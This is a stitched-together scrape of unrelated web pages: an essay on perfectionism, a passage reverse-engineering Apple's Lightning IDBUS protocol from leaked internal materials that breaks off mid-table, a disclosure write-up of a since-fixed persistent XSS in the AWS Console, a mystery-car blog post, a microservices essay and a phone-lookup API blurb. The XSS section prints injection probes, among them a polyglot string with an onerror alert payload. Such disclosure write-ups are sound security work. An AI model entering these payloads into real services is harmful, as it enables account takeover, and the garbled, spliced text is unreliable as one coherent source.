<p><a href="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223804/A07-Some-Expectations.png"><img src="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223804/A07-Some-Expectations.png" alt="" width="1500" height="1335" srcset="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223804/A07-Some-Expectations.png 1500w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223804/A07-Some-Expectations-300x267.png 300w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223804/A07-Some-Expectations-1024x911.png 1024w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223804/A07-Some-Expectations-768x684.png 768w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223804/A07-Some-Expectations-610x543.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p>
<p>As you venture into the last quarter of the status bar, shit gets real. You now have something concrete to share with others, and there’s a central concept you want to convey. You’ve invested a lot of time, so naturally, your expectations start running quite high:</p>
<p><a href="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223808/A08-High-Expectations-1.png"><img src="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223808/A08-High-Expectations-1.png" alt="" width="1500" height="1335" srcset="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223808/A08-High-Expectations-1.png 1500w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223808/A08-High-Expectations-1-300x267.png 300w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223808/A08-High-Expectations-1-1024x911.png 1024w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223808/A08-High-Expectations-1-768x684.png 768w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223808/A08-High-Expectations-1-610x543.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p>
<p>But it is toward the upper end of this phase where perfectionism can run wild.</p>
<p>For perfectionists, the last 5% of the status bar is the bane of their existence. It is when they’ve set themselves against not just high expectations, but <em>impossible ones</em>:</p>
<p><a href="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223813/A09-Impossible-Expectations-1.png"><img src="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223813/A09-Impossible-Expectations-1.png" alt="" width="1500" height="1335" srcset="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223813/A09-Impossible-Expectations-1.png 1500w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223813/A09-Impossible-Expectations-1-300x267.png 300w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223813/A09-Impossible-Expectations-1-1024x911.png 1024w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223813/A09-Impossible-Expectations-1-768x684.png 768w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/29223813/A09-Impossible-Expectations-1-610x543.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p>
<p>There are many reasons why perfectionism can manifest. It could be <a href="https://moretothat.com/self-doubt/" target="_blank" rel="noopener noreferrer">the fear of failure</a>. It could be the fear of disapproval. It could even be a form of procrastination, acting as an excuse to delay finishing a project.</p>
<p>But ultimately, perfectionism is the result of an unattainable vision. The hands cannot recreate the idealized blueprints of the mind, no matter how hard we try. Perfectionists try to ignore this reality, but doing so will always result in a chase that never ends.</p>
<p>Creativity is largely about accepting that we are always a work in progress, and that no individual project has a definitive beginning or end. It’s the understanding that our creative potential is defined by the <span><strong>blending</strong></span> of our work to create a general trend, which we hope is progressing in the right direction.</p>
<p>Perfectionism cuts this trendline short by refusing to add more nodes to it. Since each project can only be released after it crosses some phantom finish line, nothing will ever come out. The illusion of the 100% completion bar keeps creativity from progressing, and stifles our growth as a result.</p>
<p><a href="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30135020/B01-Looking-Up-at-100.png"><img src="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30135020/B01-Looking-Up-at-100.png" alt="" width="1500" height="1100" srcset="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30135020/B01-Looking-Up-at-100.png 1500w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30135020/B01-Looking-Up-at-100-300x220.png 300w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30135020/B01-Looking-Up-at-100-1024x751.png 1024w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30135020/B01-Looking-Up-at-100-768x563.png 768w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30135020/B01-Looking-Up-at-100-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p>
<p>This is why we must view our status bar not just through the lens of expectations, but also the <span><strong>ease in which we can let our work go</strong></span>. I visualize this as a mountain that culminates in a narrow peak of perfection. Each layer corresponds to a stage that is defined by our expectations, and the narrower the layer, the less output you get from that area:</p>
<p><a href="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134812/A10-The-Mountain-rev2.png"><img src="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134812/A10-The-Mountain-rev2.png" alt="" width="1500" height="1300" srcset="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134812/A10-The-Mountain-rev2.png 1500w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134812/A10-The-Mountain-rev2-300x260.png 300w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134812/A10-The-Mountain-rev2-1024x887.png 1024w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134812/A10-The-Mountain-rev2-768x666.png 768w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134812/A10-The-Mountain-rev2-610x529.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p>
<p>Of all these layers, the sweet spot is the area of <span><strong>Good Enough</strong></span>.</p>
<p><a href="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134818/A11-Good-Enough-rev2.png"><img src="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134818/A11-Good-Enough-rev2.png" alt="" width="1500" height="1300" srcset="https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134818/A11-Good-Enough-rev2.png 1500w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134818/A11-Good-Enough-rev2-300x260.png 300w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134818/A11-Good-Enough-rev2-1024x887.png 1024w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134818/A11-Good-Enough-rev2-768x666.png 768w, https://s3-us-west-1.amazonaws.com/moretothat.com/wp-content/uploads/2020/06/30134818/A11-Good-Enough-rev2-610x529.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p>
<p>Let’s first clarify what Good Enough is <em>not</em>.</p>
<p>Good Enough is <em>not</em> shitty work. It’s not a half-assed attempt to create something just to get it out there. It’s not about releasing work that you know needed more time and thought.</p>
<p>Instead, Good Enough is when you’ve done the hard work to get it to 95%, but you understand that it’s okay to let it go. It’s the ability to recognize that 100% is a construct of the mind, and pursuing it will take you away from exploring other areas of interest.</p>
<p>Good Enough is when you know that the work isn’t perfect, but it still respects the intellect of your audience. It’s not exactly what you envisioned, but it’s still damn good enough to deserve their investment of attention.</p>
<p>Some of my posts on this site have taken me over a hundred hours to do. <a href="https://moretothat.com/how-to-calm-the-anxious-brain/" target="_blank" rel="noopener noreferrer">This one on calming anxiety</a> took at least twice that number. It’s important for me to create work that respects the attention of my readers.</p>
<p>Despite this, I haven’t released a single post that I thought was at 100%. When I finished <a href="https://moretothat.com/travel-is-no-cure-for-the-mind/" target="_blank" rel="noopener noreferrer">the most popular post</a> I’ve ever done, I remember thinking that it was at around 95% when I hit publish.</p>
<p>As a creator, you will never feel that your work is complete. You can only get it to a point where it feels right to let it go. And letting go is the only way to start something else that will further your creative progress.</p>
<p>What we lack in perfection can be made up for with consistency.</p>
<p>Good Enough is what allows us to move on and try again.</p>

                <p>Created on 1.7.20</p>

                <p>
                    Here's my little article about (almost) everything I know about Apple Lightning and related technologies: <b>Tristar</b>, <b>Hydra</b>, <b>HiFive</b>, <b>SDQ</b>, <b>IDBUS</b> and etc. But first a tiny warning...
                </p>

                <p><i>
                        Read this article on your own <b>risk</b>! The information in this artcile is based on a lot of AppleInternal materials (leaked datasheets, schematics, source codes) I read in a diagonal direction. And of course on my own research too. I have to warn you, the reader, that I have never done such a research before. Thus, this write-up might use incorrect or just weird terms and turn out partially or completely <b>wrong</b>! 
                    </i>
                </p>

                <p>
                    Before going <i>deeper</i>, let's briefly sort out the terms:
                </p>

                <div>
                    <h2>What's Lightning?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_port_pinout.jpg"><br>

                    <b>Lightning</b> - is a digital interface used in most of the Apple's iOS devices since late 2012. Replaced the old 30-pin connector</p><p>

                    

                    You can see the female port pinout on the picture above and the connector pinout on the picture below:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/lightning_connector_pinout.jpg"><br>

                    Please pay attention to the fact that in the connector, pins on both sides of connector aren't wired in exact same order. Thus, a host device have to detect orientation of a cable before doing anything else</p><p>
                    
                    

                    Though it's not always applicable. Many Lightning accessories I've played with have mirrored pinouts in their connectors
                </p></div>

                <div>
                    <h2>What're Tristar and Hydra?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/tristar_logo.png"><br>

                    <b>Tristar</b> - is the integrated circuit embedded in every device shipped with Lightning female port. Basically, it's a MUX:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/tristar_schematic.png">

                    Among many other things, its main purpose is to communicate with Lightning male connector once one was connected - detect orientation and detect <b>Accessory ID</b> and route internal interfaces like USB, UART and SWD accordingly</p><p>

                    

                    <b>Hydra</b> - is the new variant of Tristar used since iPhone 8/X. The most significant change appears to be a support of wireless charging, but that's to be verified:<br>
                    
                    <img src="https://nyansatan.github.io/lightning/resources/hydra_schematic.png"><br>

                    There're 5 major Tristar/Hydra variants known to me:</p><ul>
                        <li><b>TI THS7383</b> - first-gen Tristar used in iPad mini 1 and iPad 4</li>
                        <li><b>NXP CBTL1608A1</b> - first-gen Tristar used in iPhone 5 and iPod touch 5</li>
                        <li><b>NXP CBTL1609A1</b> - mysterious first-gen Tristar used in iPod nano 7 - <a target="_blank" href="https://www.ifixit.com/Teardown/iPod+Nano+7th+Generation+Teardown/10826#s38931">source</a></li>
                        <li><b>NXP CBTL1610Ax</b> - second-gen Tristar used since iPhone 5C/5S and apparently everything else that doesn't support wireless charging. There're multiple generations of this one (<b>x</b> - number of generation)</li>
                        <li><b>NXP CBTL1612Ax</b> - Hydra used since iPhone 8/X and apparently everything else that supports wireless charging (<b>x</b> - number of generation)</li>
                    </ul><p>

                    From now on, I'll only use the term <b>Tristar</b>, but keep in mind that it will also mean <b>Hydra</b> as well, as they are very similar in the most of aspects that are gonna be covered in this text
                </p></div>

                <div>
                    <h2>What's HiFive?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_connector.svg"><br>

                    <b>HiFive</b> - is Lightning slave, i.e. a male connector. It contains a logical element as well - that chip is known as <b>SN2025</b>/<b>BQ2025</b>
                </p></div>

                <div>
                    <h2>What're SDQ and IDBUS?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/idbus_little.png"><br>

                    These 2 terms are often referred as kind of synonyms. For convinience, I'll only use term <b>IDBUS</b> from now on, as it seems more correct to me (and that's how this technology called in the THS7383 datasheet)</p><p>

                    

                    So, <b>IDBUS</b> - is a digital protocol used for negotiations between Tristar and HiFive. Very similar to <a target="_blank" href="https://en.wikipedia.org/wiki/1-Wire">Onewire protocol</a></p></div>

                <div>
                    <h2>Now we can play</h2><p>

                    Let's sniff the negotiations between Tristar and HiFive. Take a logic analyzer, a Lightning male-to-female passthrough breakout board, some accessory (normal Lightning to USB cable would fit just fine) and of course some device with Lightning port</p><p>

                    

                    First connect logic analyzer's channels to both <b>ID</b> lines of the breakout (pins 4 and 8) and connect the breakout to the device, but do not connect the accessory just yet:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_1.jpg"><br>

                    Right after that start sampling (any rate from 2 MHz and up should be fine). You'll see something like this:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/id_lines_activity.png"><br>

                    As you can see, Tristar polls each ID line by rotation - one after another. But since we didn't connect any accessory, the polling obviously fails. At some point the device will grow tired of this endless stream of failures and stop it. Meanwhile let's examine what exactly happens while polling:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/polling_explained_1.png"><br>

                    First, we can see a long interval (~1.1 milliseconds) when the level is just high and nothing else is happening:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/charge.png"><br>

                    Apparently that time is used to charge internal HiFive's capacitor - the energy from it will be then used to power-up its internal logic chips</p><p>

                    

                    What happens next is far more interesting:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful.png"><br>

                    Obviously, that's some data flowing. But how to interpret it? How to decode it? Let's virtually split it to almost the least least significant parts - to something that I call <b>words</b>:

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful_splitted.png"><br>

                    So basically a <b>word</b> is a combination of <b>fall</b>-<b>rise</b>-<b>fall</b>:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/word_splitted.png"></p><ul>
                        <li><span>Meaningful Stage</span> - time interval taken by this stage defines meaning of a word</li>
                        <li><span>Recovery Stage</span> - time interval which is apparently required for processing the <span>Meaningful Stage</span> on recieving side and/or preparing the next word on sending stage</li>
                    </ul><p>

                    Here is a table of known word types with their time intervals for both stages we discussed above (all units are in microseconds):</p><table>
                        <tbody><tr>

                            <td>1.7</td>
                            <td>2.5</td>

                            <td>21</td>
                        </tr>
                    </tbody></table>

                    <p>

                    * - <b>STOP</b> is used when it's a last bit in a byte</p><p>

                    

                    Using the above table we can now build a simple decoder of the protocol:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/decoded.png"><br>

                    As you can see, the first word a host sends is <b>BREAK</b> - when Tristar wants to send a new request, it always starts with it. Then comes a data stage. Please pay attention to the fact that last (8th) bit of a byte has longer <span>Recovery Stage</span>. When a data stage is over, a host sends another <b>BREAK</b>. Then a slave must send a reply (after at least a 2.5 us delay - see the table). Tristar will wait for around 2.2 ms for a reply. If it's not issued in this time interval, Tristar will try to poll another ID line</p><p>

                    

                    Now let's examine the data stage on the example above - <span>0x74 0x00 0x02 0x1f</span>:

                    </p><ul>
                        <li><span>0x74</span> - request/response type. Always even for request, always odd for response (request type + 1)</li>
                        <li><span>0x00 0x02</span> - actual data. Can be empty</li>
                        <li><span>0x1f</span> - CRC8 of both the request type byte and the whole data (polynomial - 0x31, initial value - 0xff)</li>
                    </ul><p>

                    Let's connect some accessory to our setup and see what happens. I'll use Apple's original Lightning to USB cable:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_2.jpg"><br>

                    And here is what appears on IDBUS after a 0x74 request:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x75.png"><br>

                    HiFive replied! And if you scroll further you'll see a lot of other request/response pairs:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x79.png"><br>

                    Some requests do not need a response though:

                    <img src="https://nyansatan.github.io/lightning/resources/request_0x84.png"><br>
                </p></div>

                <div>
                    <h2>Interpreting IDBUS requests and responses</h2><p>

                    The most important IDBUS request is <b>0x74</b> - it is used for two purposes: to tell HiFive enable full current (in case that's supported by an accessory) and to ask it about pin configuration the cable supports and some other metadata</p><p>

                    

                    Not too much is known about how response 0x75's data is encoded. But some bits were available in a certain old Tristar datasheet:</p><table>
                        <caption>First byte of 0x75 response data</caption>

<h2 id="amazon-bug-bounty">Amazon Bug Bounty!</h2>

<p><strong>Great news:</strong> Amazon is now offering bounties via a <a href="https://hackerone.com/amazonvrp">security vulnerabiltiy research program</a></p>

<p><strong>Bad news:</strong> AWS is out of scope!</p>

<p>When I read this I remembered that a few years ago I found persistent Cross-Site-Scripting on the AWS Console.</p>

<p>This post is a write up on how I found the XSS back then, techniques I used and how they evolved over the years and Amazon’s response.</p>

<h2 id="aws-console-and-cross-site-scripting">AWS Console and Cross Site Scripting</h2>

<p>The story is that I had just created an AWS account and started using the service.</p>

<p>I wanted to start using EC2 for some projects, in particular I had just created my indie game “Wonder Witches” and was looking for a place to host a website for it.</p>

<p>At that time I was not looking for security vulnerabilities per se, just trying to understand the AWS offerings better.</p>

<p>One of my basic habits however is that whenever I create items or objects in systems I check if there are basic parsing issues.</p>

<p>This is sort of <strong>feeling the temperature of the patient that I’m dealing with</strong> so to speak. Its a basic evaluation of most things I use on the web.</p>

<p>For instance, I would create new items with names such as:</p>

<pre><code>wuzzi"/&gt;&lt;h1&gt;hello&lt;/h1&gt;
</code></pre>

<p><strong>What does this do?</strong></p>

<ol>
<li><code>wuzzi</code> is just  the regular string I want to use</li>
<li><code>"/&gt;</code> is closing a possible HTML element tag (this is basically probing for an injection)</li>
<li><code>&lt;h1&gt;hello&lt;/h1&gt;</code> is the injected payload which does not do anything malicous it just prints hello in large font</li>
</ol>

<p>This is a basic test to evaluate if there is an HTML element injection. Surprisingly, this is not uncommon and if present can typically be escalated to get <code>Cross Site Scripting</code> going.</p>

<h3 id="creating-ec2-instances-and-metadata-tags">Creating EC2 instances and metadata tags</h3>

<p>As you can guess I did just that with the <code>AWS Console</code> when creating a new EC2 instance. I was creating <code>tags</code> for the EC2 instance and named a <code>tag</code> the following:</p>

<pre><code>Apache"/&gt;&lt;h1&gt;Web Server&lt;/h1&gt;
</code></pre>

<p>This was a good (bad) choice as it turned out. The results was that next time I rendered the page (and on other pages as well) I got the following when interacting with it:</p>

<p><a href="https://embracethered.com/blog/images/2020/awsxss/aws-xss-tag1.png"><img src="https://embracethered.com/blog/images/2020/awsxss/aws-xss-tag1.png" alt="EC2 Instance Tag HTML Injection"></a></p>

<p>As you can see in the above screenshot the text <strong>Web Server</strong> got rendered via an H1 HTML tag, making it show up quite large in the drop down box. This meant that the page was vulnerable to basic HTML element injection.</p>

<p>A quick inspection of the traffic using Fiddler showed that an AJAX call was made which returned the following:</p>

<pre><code>{"tags":[{"key":"Name","resourceId":"i-0fc94007","value":"\"/&gt;&lt;h1&gt;Web Server&lt;/h1&gt;"}]}
</code></pre>

<p>This meant it was a DOM based XSS, where code on the AWS console would just blindly inject/use the data in the DOM without encoding correctly. When I saw this I immediately knew that there is a persistent XSS that allows elevation of privilege.</p>

<p>To get code execution on the domain, I created basic Javascript XSS pop-up message showing the <strong>domain</strong> that an adversary can run code on when exploiting this XSS vulnerability.</p>

<p><a href="https://embracethered.com/blog/images/2020/awsxss/aws-xss-tag2.png"><img src="https://embracethered.com/blog/images/2020/awsxss/aws-xss-tag2.png" alt="EC2 Instance Tag HTML Injection"></a></p>

<p>Looking at the actual DOM of the HTML page we can see that the following had happened:</p>

<p><a href="https://embracethered.com/blog/images/2020/awsxss/aws-xss-dom.png"><img src="https://embracethered.com/blog/images/2020/awsxss/aws-xss-dom.png" alt="EC2 Instance Tag HTML Injection"></a></p>

<p>At that point I realized that it <strong>allows a lower privileged user in an AWS account to elevate to account admin</strong> (in case an admin ever visits or explores the metadata - which is not unlikely). For that I also recorded a video as proof.</p>

<p>Intersting observation: The AWS Console form a few years ago basically still looks similar to the one from today.</p>

<h3 id="amazon-s-response">Amazon’s Response</h3>

<p>I reported this to AWS and they fixed it within a few days and they offered a free ticket for re:Invent. In retrospect, I just realized that I never went to re:Invent though, somehow that fell through the cracks.</p>

<p>The responsible disclosure never received acknowledgment on the <a href="https://aws.amazon.com/security/security-bulletins">Amazon Security Bulletin page</a>.</p>

<p>However, I remember being quite happy to help Amazon make AWS more secure. :)</p>

<p>It’s a great product.</p>

<h2 id="more-advanced-test-cases">More advanced test cases</h2>

<p>Times evolve and new technologies emerge, and with them variations of vulnerabilities appear.  Hence my basic <code>test string</code> also changed over the years. Here is a string that I still commonly use whenever I signup for a new service or product to see if there is any low hanging fruit:</p>

<pre><code>Hello'{{5*5}}"/&gt;&lt;img src=: onerror=alert(document.domain)&gt;
</code></pre>

<h3 id="explanation">Explanation</h3>

<p>It’s checking for:</p>

<ol>
<li>SQL Injection ==&gt; <code>'"</code> might throw a syntax error</li>
<li>HTML Template Injection ==&gt;  <code>{{5*5}}</code> if a rendered page ever displays <code>25</code>, there is an injection issue</li>
<li>HTML Element Injection ==&gt;  A basic Cross Site Scripting (XSS) test, which would display a pop-up message showing the <code>domain</code> which we execute code on</li>
</ol>

<p>I’m certain five years from now that test string will look again slightly different.</p>

<h2 id="that-s-it">That’s it.</h2>

<h2>Caution.</h2>
<p>Read this at your peril! This is not a postcard, though it is not out of place here. It is a photograph that contains a car whose presence is entirely incidental; just what we are looking for in this blog.&nbsp; Many readers will already have seen it as it has been posted many times over the years on many different forums because people want to know what the car is. So far it has eluded us all.</p>
<p>Many many times people have shouted out in joy on a forum, “I know! It’s a ___!” only to be brought up short by someone else who posts anther picture disproving the assertion. It’s like the end of a game of Cluedo. “I know! It’s a ____”. So we open the envelope and all discover, no it’s not. Maybe one element is right but not the whole thing.</p>
<h2>Pistonheads Forum</h2>
<p>For anyone tempted to guess right now on this blog, please do not. Please look at the Pistonheads thread called <a href="https://www.pistonheads.com/gassing/topic.asp?h=0&amp;f=140&amp;t=1555306" target="_blank" rel="noopener noreferrer">Another Mystery Car</a> first&nbsp;&nbsp;This thread was started on&nbsp;Tuesday 17th November 2015. It now contains&nbsp;2,804 posts and scores of photographs of similar cars which are almost it, but not quite.&nbsp; Here are just a few…</p>

<h2>Slightly Odd</h2>
<p>People’s lives have been ruined. There are petrolheads all over the world spending their every waking moment trawling through old copies of motor magazines searching for articles and adverts. But nobody has found anything.&nbsp; This is slightly odd because this car is clearly not a mock-up concept car; it is on the streets of London. You would have thought someone would have found it. Maybe it is a one-off vehicle used in a film? Nope. You can do a reverse image search with<a href="https://www.tineye.com/" target="_blank" rel="noopener noreferrer"> Tin Eye</a>&nbsp;(You upload an image and it will find the same image and similar images wherever they are on the web) and it fails to find it even on the very comprehensive <a href="http://www.imcdb.org/" target="_blank" rel="noopener noreferrer">International Movie Cars Database</a>.</p>
<h2>From a book</h2>
<p>When I first became aware of it I thought it was probably a postcard. However someone has tracked it down and it’s actually a photograph in a book called <em>Buses, Trolleys and Trams</em> by&nbsp;Chas. S. Dunbar. If you want to get back to the root of all this, get yourself a copy, they’re as cheap as chips secondhand on Amazon.</p>
<h2>Bizarre</h2>
<p>Now here’s a bizarre thing.&nbsp; An artist by the name of&nbsp;Wallace Trickett&nbsp; was commissioned to paint this…</p>

<p>It is clearly based on our photograph. The little white Ford van is in position as is the Ford Anglia. It is the same location but the buses have been re-positioned slightly and have changed from AEC Regent III RTs to become RouteMasters and the women have gone to improve the composition, but what’s happened to our much loved mystery car? It’s been usurped by a London cab.&nbsp; People on forums have contacted Mr Trickett and he has responded, but there’s nothing to be learnt here really, it’s just another avenue that sucks you in and robs you of your valuable time.

<source data-srcset="https://kelda.io/img/blog/Dark%20Side.webp" type="image/webp"></picture><p><h2>Published on Feb 1, 2020</h2></p></section><p>There is an endless supply of blog posts, white papers, and slide decks, evangelizing the virtues of microservices. They talk about how microservices “increase agility,” are “more scalable,” and promise that when you make the switch, engineers will be pounding at your office door looking for a job.</p><p>Let’s be clear, though occasionally exaggerated, the benefits of microservices can be real in some cases. Particularly for large organizations, with many teams, microservices can make a lot of sense. However, microservices aren’t magic – for all of their benefits, they come with significant drawbacks. In this post, I’ll describe how the distributed nature of microservices makes them inherently more complex.</p><p>A distributed system is any collection of computers that work together to perform a task. Microservices are simply a type of distributed system designed for delivering the backend of a web service.</p><p>Since the early days of distributed systems research going back to the 70s. We’ve known that distributed systems are hard. From a theoretical perspective, the difficulty mostly arises from two key areas: consensus and partial failure.</p><h2 id="consensus">Consensus</h2><p>From a theoretical perspective, the fundamental issue with building workable distributed systems comes down to the problem of consensus – agreement on distributed state. Nearly all distributed systems research attempts to grapple with this problem in some way. Paxos, Raft, Vector Clocks, ACID, Eventual Consistency, Map Reduce, Spark, Spanner, and most other significant advances in this area all are fiddling with the tradeoff between strong consensus and performance in some way.</p><p>To better understand the problem of distributed consensus, let’s illustrate with an example. Suppose <code>Bob</code> asks <code>Server_1</code> to write <code>x=5</code> while concurrently <code>Jill</code> asks <code>Server_2</code> to write <code>x=6</code>, does <code>x</code> equal <code>5</code> or <code>6</code>? Naively, one could look at the time <code>x=5</code> occurred, and the time <code>x=6</code> occurred, and choose whichever happened last. But how do you determine the <em>time</em> the writes happened. Look at a clock? Whose clock? How do you know that clock is accurate? How do you know, <code>Bob</code>, <code>Jill</code>, <code>Server_1</code>, and <code>Server_2</code> agree with that clock? Clocks are notoriously out of sync, and (as Albert Einstein taught us), that’s not fixable[1]. For that matter, does everyone really need to agree on the value of <code>x</code>? If so, how much agreement? How long should the agreement take? What if <code>Bob</code> dies while trying to reach agreement? It gets complicated.</p><p>So, given that distributed consensus is hard, how does this problem manifest in the context of microservices? Good microservice implementations tend to sidestep the issue altogether by simply disallowing shared state. In the case of our above example, there exists no <code>x</code> such that two microservices need to agree on the value of <code>x</code> at any particular point in time. Instead, all shared state in the system is punted to an external database or the container orchestrator.</p><p>This approach both does and doesn’t solve the consensus problem. It doesn’t solve the problem in the sense that, from a theoretical perspective, there still is shared state that still requires management. You’ve just moved it. By the way, this is why Kubernetes and databases are so darn complicated.</p><p>The approach does solve the problem in that, from a practical perspective, Kubernetes and databases are better at managing shared state than most microservices. Those systems are designed by engineers who spend all day every day thinking about these issues. As a result, they’re more likely to get consensus right.</p><h2 id="partial-failure">Partial Failure</h2><p>Consider an HTTP request serviced by a monolith. When the request is received, a single server handles the transaction from beginning to end. If there is a problem, be it a software bug or hardware failure, the entire monolith crashes – every failure is a total failure.</p><p>Now consider the same HTTP request coming into a microservice. That microservice may send new requests to other microservices who, in turn, may generate more requests going to yet more microservices. Now suppose one of those microservices fails. What now? One or more microservices are depending on the data <em>that</em> microservice was preparing. What should they do? Wait for a while? How long? Try again? Try someone else? Who else? Give up and do their best with the data they’ve got? Microservices must be engineered to handles these issues, again making them more challenging to develop.</p><p>Partial failure has been described as an unqualified good thing. The thinking goes, by supporting partial failure, an application becomes more resilient – small problems can be papered over gracefully. In my opinion, the benefits are small, rarely obtained in practice, and come at the expense of vastly increased implementation complexity.</p><p>In addition to the theoretical challenges of microservices, there’s also just a lot of them. Having so many moving pieces complicates nearly every part of the stack and every part of the software development lifecycle.</p><p><strong>Development</strong>
You can typically run a monolith directly on your laptop. Getting microservices to work on a local machine requires more specialized tools such as docker-compose and minikube. Furthermore, they’re CPU and memory intensive, making them painfully slow on a laptop. Note, check out <a href="https://kelda.io/">Kelda</a>, and specifically our <a href="https://kelda.io/whitepaper/">whitepaper</a> for a detailed description of this problem.</p><p><strong>Debugging</strong>
Everything happening in a monolith occurs in a single process. You can attach the debugger of your choice, and you are off to the races. With microservices, a single request may be spread across dozens of different processes. Distributed tracing tools like Jaeger may help, but it’s still a challenge.</p><p><strong>Logging</strong>
With a monolith, you can store logs in a file and grab them when needed. With microservices, you need a tool like Splunk or the ELK stack to handle this for you.</p><p><strong>Monitoring</strong>
Simple on-server monitoring tools like Nagios don’t scale when you’ve got hundreds of microservices. Again, better tools (Prometheus/Datadog/Sysdig, etc.) make the problem tractable, but it’s still hard.</p><p><strong>Deployment</strong>
Tools like Chef and Puppet are good enough for deploying a monolith, but for microservices, you need something much more sophisticated like Kubernetes.</p><p><strong>Networking</strong>
Monoliths can be handled with a simple load balancer. Microservices have many more endpoints, all of which require load balancing, service discovery, consistent security policy, etc. I suppose service mesh can help with this (I’m not convinced, but that’s a topic for a future post).</p><h2 id="microservices-make-sense-sometimes">Microservices Make Sense, Sometimes</h2><p>From a technical perspective, microservices are strictly more difficult than monoliths. However, from a human perspective, microservices can have an impact on the efficiency of a large organization. They allow different teams within a large company to deploy software independently. This means that teams can move quickly without waiting for the slowest common denominator to get their code QA’d and ready for release. It also means that there’s less coordination overhead between engineers/teams/divisions within a large software engineering organization.</p><p>And while microservices can make sense, the key point here is that they aren’t magic. Like nearly everything in computer science, there are tradeoffs — in this case, between technical complexity for organizational efficiency. A reasonable choice, but you better be sure you need that organizational efficiency, for the technical challenges to be worth it.</p><p>[1]: Yes, of course, most clocks on earth aren’t moving anywhere near the speed of light. Furthermore, several modern distributed systems (notably Spanner), rely on this fact by using extremely accurate atomic clocks to sidestep the consensus issue. Still, these systems are, themselves, extremely complicated, proving my point: distributed consensus is hard.</p><h3 id="blimphttpslinkkeldaiohomepage-is-a-saas-docker-compose-replacement"><a href="https://link.kelda.io/homepage"><strong>Blimp</strong></a> <strong>is a Saas Docker Compose replacement.</strong></h3></div></div>]]>

            </p>

            <p>An API call with an international telephone number as an input parameter can give you the city, region, country,
                and a significant amount of other information pertaining to that phone number, including general wealth category and
                likely languages spoken.

            <p>
                The ability to segment information based on geographic and other generalized demographic information can be quite
                useful in customer analysis, marketing campaigns, lead scoring, Website personalization, and online advertising.
            </p>

